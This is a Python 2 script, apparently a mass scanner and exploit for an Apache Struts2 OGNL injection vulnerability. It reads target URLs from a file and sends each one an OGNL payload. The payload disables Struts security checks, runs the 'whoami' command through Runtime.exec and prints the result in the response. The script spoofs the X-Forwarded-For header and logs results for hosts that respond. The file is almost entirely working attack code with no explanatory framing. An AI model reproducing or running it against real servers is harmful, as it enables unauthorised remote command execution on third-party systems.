#coding:utf-8
import requests
import base64
import urllib2
import httplib
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
#url = 'http://192.168.1.22:8080/example/HelloWorld.action'
data = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"
headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0han) Gecko/20100101 Firefox/49.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding': 'gzip, deflate',
			'DNT': '1',
			'X-Forwarded-For': '8.8.8.8',
			'Connection': 'close',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '667'}
page = ''      
f = open('url.txt')
for line in f.readlines():
	try:
		url = line.replace('\n','')
		req  = urllib2.Request(url, data=data,headers=headers)
		n = urllib2.urlopen(req)
		page = n.read()
		# if 'PID' in page:
		pageone = page.replace(' ','')
		print url+'------'+page[0:40]
		datas = open(r"ok.txt","a")
		datas.write(url+'------'+page[0:40]+'\n')	
	except Exception as e:
		print 'error-------------'+str(url)
		print '#########################################################################'


                
